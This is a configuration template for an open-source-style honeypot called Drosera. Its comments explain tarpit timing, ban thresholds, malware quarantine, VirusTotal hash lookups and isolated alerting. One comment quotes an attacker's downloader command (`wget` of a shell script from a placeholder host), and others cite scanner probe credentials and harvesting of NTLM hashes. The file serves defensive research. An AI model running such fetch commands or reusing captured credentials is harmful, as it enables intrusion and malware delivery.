# Drosera configuration. Copy to .env and edit:  cp .env.example .env
#
# .env is gitignored. Nothing here is a secret except the optional alert
# credentials at the bottom -- the admin password and TOTP secret live in
# admin-dashboard/config/admin-config.json, created by setup.py, and are
# deliberately never passed through the environment.

# ---------------------------------------------------------------- deployment

# The domain pointed at this VPS. Used for the self-signed fallback cert's CN.
DOMAIN=example.com

# ---------------------------------------------------------------- scoring

# Cumulative points at which an IP is auto-banned (redirected to the rickroll,
# and written to the fail2ban evidence log for host-level firewalling).
HONEYPOT_BAN_THRESHOLD=35

# Cumulative points at which the tarpit engages for an IP.
HONEYPOT_TARPIT_THRESHOLD=5

# How long the dashboard's "Release tarpit" keeps an address out of it.
#
# Needed because the release does not touch the score -- that is the record of
# what they did. The score stays over the threshold, so without an exemption
# the next scored event re-engages the tarpit in the same second the attacker
# reconnects, and the button appears to do nothing. Bounded rather than
# permanent: a release made by accident is invisible afterwards, since the
# address simply never gets tarpitted again and nothing says why.
HONEYPOT_TARPIT_RELEASE_SECONDS=3600

# How long a ban lasts, in seconds. Default 7 days.
HONEYPOT_BAN_TTL=604800

# Set 1 to make every SSH and telnet login succeed, as this did before.
#
# Not recommended. A scanner offers a real guess, then one that cannot exist on
# any machine -- `charles:charles` followed by `345gs5662d34:345gs5662d34` --
# and two successes tell it nothing here is real. That is one probe, and
# everything the honeypot exists to record happens after the login. By default
# common and guessable credentials are accepted, the way a neglected box with a
# weak password behaves, and machine-generated strings are refused.
HONEYPOT_ACCEPT_ANY_PASSWORD=0

# Passwords this deployment accepts, on top of the built-in list.
#
# Worth setting once the honeypot has a week of traffic. The built-in list is
# published, and a published accept-list has the same weakness it defends
# against -- read the repo, pick a password that is not in it, and you have a
# probe. Build a per-deployment list from your own captured logins with:
#
#     python3 deploy/extract-credentials.py           # report
#     python3 deploy/extract-credentials.py --write   # save
#
# It keeps passwords tried by several distinct addresses, since those are the
# ones in real spray lists, and drops machine-generated strings however popular
# they are. The file lives under storage/ and is gitignored: these are real
# credentials and may belong to other victims.
# HONEYPOT_ACCEPT_WORDLIST=/var/honeypot/storage/credentials/accepted.txt

# Addresses never scored, tarpitted, banned, or counted in the statistics.
# Single addresses or CIDR ranges, comma separated. Put your admin address
# here: browsing your own site a few times is indistinguishable from an attack
# otherwise, and enough visits will ban you from your own honeypot.
# HONEYPOT_IGNORE_IPS=203.0.113.9,198.51.100.0/24

# The Docker bridge gateway is ignored automatically, detected from the
# container's own routing table rather than hardcoded, since the subnet is
# Docker's to choose. That address is the host reaching in -- health checks,
# deploy/smoke-test.sh, any curl you run on the box -- and left scored it
# climbs steadily across all six services. The ban is the dangerous part, not
# the score: fail2ban's action is `ufw insert 1 deny from <ip>`, which against
# a bridge gateway cuts the host off from every container it runs.
# Set 0 only if you specifically want to study traffic from the gateway.
HONEYPOT_IGNORE_GATEWAY=1

# ---------------------------------------------------------------- sample loot
#
# Payloads attackers drop are quarantined in storage/loot/, named by SHA-256,
# mode 0400, never on a PATH and never under a document root. Nothing in the
# honeypot opens or runs them.
LOOT_MAX_FILE_BYTES=16777216
LOOT_MAX_TOTAL_MB=2048
# Below this a "file" is a capability probe, not a payload.
LOOT_MIN_FILE_BYTES=24

# VirusTotal enrichment, done by the intel container -- the honeypots have no
# egress and cannot do this themselves. Free key from virustotal.com/gui/join-us.
# Leave empty to quarantine without scanning.
#
# It sends a hash, never the file. Uploading a sample publishes it to VT's
# customers, which include the people who write the malware and who monitor VT
# for their own payloads; for a targeted implant that tells the operator they
# were caught and can disclose whatever the binary embeds. Submit by hand if
# and when you decide that is fine.
VT_API_KEY=
VT_POLL_SECONDS=300
# Free tier is 4 requests/minute. Stay well inside it.
VT_REQUEST_INTERVAL=20
VT_MAX_PER_RUN=20

# Run `nmap` in either fake shell and the report comes back on the attacker's
# own address, ending with what this honeypot has actually recorded about them:
# sessions, services probed, credentials offered, threat score.
#
# Nothing is really scanned -- the honeypot has no egress, and scanning back
# would be a live port scan aimed at a third party (frequently a victim's
# compromised box, not the attacker's own) and would expose this host besides.
#
# The trade-off is that a careful attacker reads that block and leaves, which
# costs you the rest of the session. Set to 0 to keep them talking.
HONEYPOT_SCANBACK=1

# What a banned address gets. All three tiers read one file,
# shared/rickroll.txt, and drip it rather than sending it at once, so the ban
# path is a last tarpit rather than a parting shot.
#
# RICKROLL_URL alone reaches almost none of the traffic that earns a ban: a 302
# is only a rickroll to something that follows redirects, and curl-based
# scanners and SSH-2.0-Go worms do not. So the redirect is kept for clients that
# ask for text/html -- real browsers -- and everything else gets the art as
# text/plain, or straight down the socket on SSH and telnet.
#
# This is the one point where the deception is dropped on purpose. By the time
# an address is banned it has scored past HONEYPOT_BAN_THRESHOLD and been
# firewalled at the host, so there is no illusion left to protect -- but it does
# tell that one attacker they were in a honeypot. Set to 0 to keep the ban
# silent: the terminal services drop the connection and the website goes back to
# redirecting everyone.
HONEYPOT_RICKROLL=1

# How long the drip is allowed to take, per connection. The art is about a
# kilobyte; at the tarpit's normal per-byte pacing it would run for twenty
# minutes and hold a connection slot the whole time. On the web this shares
# TARPIT_MAX_CONCURRENT, so a banned flood can never starve the PHP-FPM pool.
HONEYPOT_RICKROLL_DRIP_SECONDS=120

# HTTP requests per minute per IP before rate-limit abuse is scored.
RATE_LIMIT_RPM=60

# --------------------------------------------------------------- fail-safes

# Stop writing logs and recordings once storage/ exceeds this many MB. Prevents
# a sustained attack from filling the disk and taking the box down.
HONEYPOT_MAX_STORAGE_MB=4096

# A tarpit pins one PHP-FPM worker. Never let more than this many run at once,
# or tarpits starve the site of capacity. Must stay below pm.max_children (64).
TARPIT_MAX_CONCURRENT=24

# Hard ceiling on a single HTTP tarpit, in seconds. Default 15 minutes.
TARPIT_MAX_SECONDS=900

# Hard ceiling on a single SSH tarpit hold, in seconds. Default 30 minutes.
#
# Only a ceiling. What ends most holds is the client's own read deadline, so
# raising this alone changes nothing -- the interval below is the real lever.
SSH_TARPIT_MAX_SECONDS=1800

# Gap between the junk lines that hold a tarpitted SSH client.
#
# Counter-intuitive: shorter gaps hold them LONGER. A client measures silence,
# not elapsed time, and every line resets its deadline. Lines arriving well
# inside that deadline keep the connection alive indefinitely; a gap wider than
# it ends the hold. Widening these makes the tarpit shorter, not slower.
#
# Costs us a sleeping thread and a socket either way.
SSH_TARPIT_LINE_MIN=1.5
SSH_TARPIT_LINE_MAX=4.0

# Concurrent tarpit holds allowed from one address. Longer holds mean
# connections accumulate: at 30 minutes, a scanner reconnecting once a minute
# reaches thirty simultaneous slots, and SSH_MAX_CONNECTIONS is 200. Per
# address rather than global, so a flood costs its own source and not our
# coverage of everyone else.
SSH_TARPIT_PER_IP=8

# Connections the SSH honeypot will hold before shedding new ones.
SSH_MAX_CONNECTIONS=200

# Redis memory ceiling. Oldest identities are evicted (LRU) beyond this.
REDIS_MAXMEMORY=512mb

# ----------------------------------------------------------------- dashboard

# Operator session lifetime in seconds. Default 8 hours.
ADMIN_SESSION_TTL=28800

# The dashboard is reached as plain http over an SSH tunnel to 127.0.0.1, where
# a Secure-flagged cookie would be dropped. Set true only if you put real TLS
# in front of it.
ADMIN_COOKIE_SECURE=false

# --------------------------------------------------------- automatic TLS
#
# Optional, and off by default. The lower-maintenance option is still a
# Cloudflare Origin Certificate dropped into certs/ -- valid 15 years, no
# renewal machinery, and the origin certificate is only ever shown to
# Cloudflare so public trust buys nothing.
#
# Use this if you run unproxied (grey cloud), or would rather never place a
# certificate by hand:
#
#   docker compose --profile letsencrypt up -d
#
# DNS-01 only. HTTP-01 cannot work here (the honeypot's catch-all swallows
# /.well-known/, and the web container's rootfs is read-only), and TLS-ALPN-01
# cannot pass through the Cloudflare proxy.
#
# Create the token at Cloudflare > My Profile > API Tokens, using the "Edit
# zone DNS" template, scoped to this zone only.
# CF_DNS_API_TOKEN=
# LETSENCRYPT_EMAIL=you@example.com

# Issue against the staging CA first. Let's Encrypt rate-limits hard -- five
# failures per hostname per hour -- so prove the plumbing before spending real
# quota. Staging certificates are untrusted by design; expect browser warnings.
LETSENCRYPT_STAGING=false

# How often to check for renewal, and how long to wait for the DNS record to
# propagate before asking the CA to validate it.
LETSENCRYPT_CHECK_INTERVAL=43200
LETSENCRYPT_PROPAGATION_SECONDS=30

# ------------------------------------------------------------------- FTP

# Public IP to advertise in PASV replies. Leave blank to use the container's
# own address, which is correct for most single-host deployments.
FTP_PASV_ADDRESS=

# ------------------------------------------------------------------ misc

RICKROLL_URL=https://www.youtube.com/watch?v=dQw4w9WgXcQ

# ------------------------------------------------------------- alerting
#
# IMPORTANT: both Docker networks are `internal: true`, so containers have no
# internet access and these outbound channels stay inert until you deliberately
# grant egress. See "Enabling outbound alerting" in deploy/README.md.
# JSONL logging and the fail2ban evidence log always work and need no egress.

# ALERT_WEBHOOK_URL=https://your-endpoint.example/hooks/drosera
# ALERT_TELEGRAM_BOT_TOKEN=123456789:ABCDEFGHIJKLMNOPQRSTuvwxyz
# ALERT_TELEGRAM_CHAT_ID=123456789
# ALERT_SYSLOG_HOST=192.0.2.1
# ALERT_SYSLOG_PORT=514

# --------------------------------------------------------- session camera
#
# session-cam renders finished attacker sessions to video and delivers them.
# Unlike the channels above it DOES work out of the box, because it runs in its
# own container on the only non-internal network. It reads recordings off the
# storage volume and is on no network the honeypot can reach, so giving it
# egress does not give the honeypot egress. See deploy/README.md section 13.

CAM_ENABLED=true

# gif | mp4 | both. ffmpeg ships in the session-cam image, so mp4 works out of
# the box and is the default: it is what makes full-session playback
# deliverable. A whole session as a GIF runs to tens of megabytes and gets
# dropped at CAM_MAX_CLIP_MB; the same frames as H.264 arrive comfortably
# inside Telegram's limit. Falls back to a sampled GIF if ffmpeg is ever absent.
CAM_FORMAT=mp4

# Only sessions at or above this score are rendered and sent. Most recordings
# are a scanner connecting and leaving; without a floor the useful ones drown.
CAM_MIN_SCORE=5
CAM_MIN_DURATION=2

# Above this score, the content and time floors below stop applying.
#
# Those floors ask "did anything happen" by measuring length, and that proxy
# fails on the best bots: a Go or Python client that authenticates, runs one
# recon command and leaves does it in under two seconds and a few hundred bytes.
# The score already answers the question directly, so past this point length is
# no longer asked about. Raise it if your clips get noisy; lower it to catch
# more short-but-deliberate sessions.
CAM_ALWAYS_SCORE=15

# Rickroll deliveries are recorded and included in evidence bundles, but not
# rendered to video. No threshold can filter them -- they are long, dense, and
# only ever sent to banned addresses, so on every axis the floors above measure
# they look like a session worth watching. What they contain is the same picture
# every time, and a banned scanner reconnects hundreds of times a day.
# Set false to render them anyway; worth doing once, pointless as a standing
# setting.
CAM_SKIP_RICKROLL=true

# How long clips are kept, and the ceiling on storage/clips before the oldest
# are dropped. The .cast recordings are the real evidence and are not affected.
CAM_RETENTION_DAYS=14
CAM_MAX_CLIPS_TOTAL_MB=1024

# Telegram will not accept media over 50MB.
CAM_MAX_CLIP_MB=45

# Frames per clip when nothing asks for a specific budget, and the cap that
# applies when the GIF is what actually gets delivered -- CAM_FORMAT=gif/both,
# or ffmpeg missing.
#
# You do not set full playback here. The camera asks for it per clip, when it
# knows an ffmpeg step follows and the GIF is only an intermediate on the way to
# an MP4: sampling to a fixed budget quietly dropped the middle of any long
# session, which is usually the part worth watching. Idle gaps are still
# squeezed (CAM_MAX_IDLE_SECONDS) because that removes silence rather than
# content, and the HUD clock still shows real elapsed time.
#
# CAM_MAX_FRAMES=0 means "no cap" and is accepted, but there is no reason to set
# it -- and a container still running an older renderer treats 0 as a divisor
# and crashes on the first recording it picks up.
CAM_MAX_FRAMES=420
CAM_GIF_SAFETY_FRAMES=420

# The webshell is stateless HTTP, so commands from one IP are grouped into a
# single recording until this many seconds pass with no new command.
CAM_WEB_IDLE_SECONDS=900

# Whether scanner probes and tarpit drips are recorded too, into the same
# per-IP recording as webshell commands. Previously only the webshell was
# recorded, which meant the live feed showed almost nothing -- probes and
# tarpits are the overwhelming majority of what arrives. Set false if the extra
# file churn on a heavily scanned host is not worth it.
CAM_RECORD_WEB_PROBES=true

# A banned address reconnects every few seconds and is handed the same rickroll
# every time. Recording each delivery produced 321 near-identical files for one
# address in half an hour and left nothing else visible on the live feed, so
# only one per address per this many seconds is kept. The drip still runs on
# every connection and the held time is still counted -- only the duplicate
# recording is skipped. Set 0 to record every delivery.
HONEYPOT_RICKROLL_RECORD_INTERVAL=3600

# Telegram delivery reuses ALERT_TELEGRAM_* above. Email delivery is separate,
# and these credentials are passed only to session-cam:
# CAM_SMTP_HOST=smtp.example.com
# CAM_SMTP_PORT=587
# CAM_SMTP_USER=drosera@example.com
# CAM_SMTP_PASSWORD=
# CAM_SMTP_SECURITY=starttls        # starttls | ssl | none
# CAM_MAIL_FROM=drosera@example.com
# CAM_MAIL_TO=you@example.com

# ---------------------------------------------------------------- smb
# How many credential submissions are refused before the session is granted.
# The NTLMv2 hash is captured on the first one either way, so refusing again
# only buys another spray attempt -- at the cost of every client that gives up
# after one failure, which is most of them. Raise it if you would rather farm a
# password spray than watch someone browse the shares.
SMB_FAIL_ATTEMPTS=0

# Set false to refuse every login, as this did before shares were browsable.
# SMB_ALLOW_SESSION=false

# Open file handles allowed per session. Opens are attacker-driven and closes
# are optional, so this is the bound on a dictionary they control.
SMB_MAX_HANDLES=512

# ---------------------------------------------------------------- mysql
# Largest packet accepted from a client, and the value reported for
# @@max_allowed_packet -- they are the same number on purpose. Advertising a
# ceiling above what the reader accepts moves the disconnect from the handshake
# to the first large query instead of preventing it.
MYSQL_MAX_PACKET=1048576

# ------------------------------------------------------- tarpit slow-drain

# Ceiling on how long a service will hold a tarpitted connection open.
# MySQL, SMTP and FTP were marking addresses for tarpitting and then answering
# them at full speed anyway -- MySQL did not import the tarpit at all, and SMTP
# only paused once on EHLO. All three now drain like SMB and register the hold,
# so a tarpitted address gets the same treatment whichever port it knocks on.
SMB_TARPIT_MAX_SECONDS=600
RDP_TARPIT_MAX_SECONDS=600
MYSQL_TARPIT_MAX_SECONDS=600
SMTP_TARPIT_MAX_SECONDS=600
FTP_TARPIT_MAX_SECONDS=600

# Floor on the delay between bytes when trickling a response to a tarpitted
# client. Short PDUs are paced to fill the whole hold window rather than this
# floor, up to TARPIT_MAX_BYTE_GAP -- past that, clients start giving up.
TARPIT_BYTE_DELAY=1.5
TARPIT_MAX_BYTE_GAP=10

# Random range used to stall each response from SMB, MySQL, SMTP and FTP.
# Randomised because a constant delay is a fingerprint a scanner can learn.
#
# Same lesson as SSH_TARPIT_LINE_MIN/MAX: a client measures silence, not
# elapsed time, so a gap wider than its read deadline ends the hold instead of
# lengthening it. Was 4-15; fifteen seconds is past the patience of several
# clients in the logs, so the wide end was losing connections it was meant to
# be keeping.
TARPIT_STALL_MIN=2
TARPIT_STALL_MAX=6

# How much of an attacker's command line is kept as evidence. Was 200, which
# cut every dropper chain in half -- their opening recon block runs to a couple
# of thousand characters. Alerting truncates at 500 regardless, so this is the
# real ceiling.
HONEYPOT_PAYLOAD_CHARS=500

# ------------------------------------------------------- elasticsearch stats
#
# T-Pot-style analytics: Elasticsearch + Kibana, fed by elastic-shipper reading
# storage/logs/*.jsonl. All three sit on `elastic-internal` and no honeypot
# container is a member, so nothing an attacker reaches can touch the stack.
#
# Kibana is published on 127.0.0.1 only. Reach it the same way as the dashboard:
#   ssh -N -L 5601:127.0.0.1:5601 -p 2222 you@vps
# then open http://127.0.0.1:5601 and log in as `elastic`.
#
# The whole stack is behind a Compose profile and is OFF by default, so a plain
# `docker compose up -d` ignores everything in this section. Start it with:
#   docker compose --profile elastic up -d
#
# Required once you do enable it -- the shipper exits without them. Use long
# random values: `openssl rand -base64 24` twice.
ELASTIC_PASSWORD=
KIBANA_PASSWORD=

KIBANA_PORT=5601

# Set this to make the operator dashboard show a Kibana link in its sidebar.
# It is only a link target for your browser; the dashboard never connects to
# Kibana itself and is not on the elastic network.
# KIBANA_PUBLIC_URL=http://127.0.0.1:5601

# Elasticsearch wants memory. ELASTIC_HEAP is the JVM heap and should be about
# half of ELASTIC_MEM_LIMIT, never more. Budget ~2.5GB of RAM for the search
# stack; below roughly 4GB total on the VPS, leave this stack switched off.
ELASTIC_HEAP=512m
ELASTIC_MEM_LIMIT=1536m
KIBANA_MEM_LIMIT=1024m

# How long events are kept in Elasticsearch. The JSONL logs on disk are the
# authoritative record and are governed separately by logrotate.
ELASTIC_RETENTION_DAYS=90
ELASTIC_POLL_SECONDS=15
ELASTIC_INDEX_PREFIX=drosera

# Several deployments shipping into one Elasticsearch. Leave all four unset for
# a single instance. See "Several instances, one Elasticsearch" in the README --
# this gives elastic-shipper egress, which it deliberately does not have, and
# the central cluster ends up holding the record for every sensor.
#
# ELASTIC_USERNAME must be that sensor's own append-only account, not `elastic`.
# Sharing the superuser means one compromised sensor can delete the whole
# fleet's evidence; the README has the two commands that create the role and a
# per-sensor user on the hive.
# DROSERA_INSTANCE=vps-fra-01
# ELASTIC_URL=https://es.example.net:9200
# ELASTIC_USERNAME=sensor_fra01

# ---------------------------------------------------------------- geoip
#
# Powers country/city on every IP in the dashboard and the map in Kibana.
# Without it, geolocation falls back to Cloudflare's country header, which
# exists only for proxied web traffic -- so SSH, telnet, SMB and RDP show
# nothing at all.
#
# Free signup: https://www.maxmind.com/en/geolite2/signup
# Then My Account -> Manage License Keys -> Generate new key.
#
#   ./deploy/update-geoip.sh
#
# MaxMind refreshes weekly; run that from cron to keep it current. The database
# is never fetched by a container -- elastic-internal has no egress, and the
# honeypot must not gain any.
# MAXMIND_ACCOUNT_ID=
# MAXMIND_LICENSE_KEY=

# ------------------------------------------------- second-stage retrieval
#
# A honeypot with no egress sees far more downloaders than dropped files. The
# loader that lands here fifty times a day says `wget http://x/nz.sh` -- the
# fetch fails, so there is no file and nothing for VirusTotal. The URL is
# recorded either way, in storage/ioc/, and shown on the attacker profile.
#
# Setting this true makes the intel container go and get the file, so you end
# up with real samples. It is the one component that connects OUT to
# infrastructure an attacker chose, so understand the trade first:
#
#   - your address contacts theirs, and a loader host that sees a fetch from a
#     machine it just "infected" learns it found a honeypot
#   - they choose what you receive, which is why size, time and redirects are
#     all bounded below rather than trusted
#   - you will be storing live malware; clear it with your provider first
#     (AUTHORIZATION.md 2.1)
#
# No honeypot gains a route out either way: they write the IOC to the shared
# volume, the intel container reads it, and the two share no network.
FETCH_ENABLED=false
FETCH_MAX_BYTES=8388608
FETCH_MAX_PER_HOUR=20
FETCH_HOST_COOLDOWN=3600
FETCH_TIMEOUT=8
FETCH_POLL_SECONDS=60
